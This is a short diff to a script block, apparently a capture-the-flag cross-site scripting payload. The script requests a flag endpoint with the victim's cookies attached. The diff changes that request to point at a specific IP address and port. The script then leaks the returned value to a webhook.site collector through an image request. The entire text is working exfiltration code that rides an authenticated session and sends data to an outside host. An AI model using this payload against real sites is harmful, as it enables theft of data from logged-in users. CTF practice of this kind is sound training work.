@@ -1,5 +1,5 @@
 <script>
-fetch('/api/fetchflag', {credentials: 'include'})
+fetch('http://95.217.6.37:20001/api/fetchflag', {credentials: 'include'})
   .then(r => r.json())
   .then(d => {
     new Image().src = 'https://webhook.site/dcc15227-d003-45fa-b818-3bc971c36d17/?flag=' + encodeURIComponent(d.flag);
